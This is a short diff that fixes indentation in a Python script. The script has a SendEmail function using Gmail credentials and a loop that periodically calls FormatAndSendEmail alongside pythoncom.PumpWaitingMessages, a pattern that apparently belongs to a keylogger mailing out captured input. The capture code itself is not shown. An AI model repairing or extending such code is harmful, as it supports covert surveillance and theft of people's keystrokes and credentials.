@@ -13,7 +13,7 @@ def TimeOut():
         return False
         
 def SendEmail(user, pwd, recipient, subject, body):
-     import smtplib
+    import smtplib
     gmail_user = user
     gmail_pass = pwd
     FROM = user
@@ -54,6 +54,5 @@ while True:
     if TimeOut():
         FormatAndSendEmail()
         timeout = time.time() + wait_seconds
-      
-     pythoncom.PumpWaitingMessages()
+    pythoncom.PumpWaitingMessages()
         
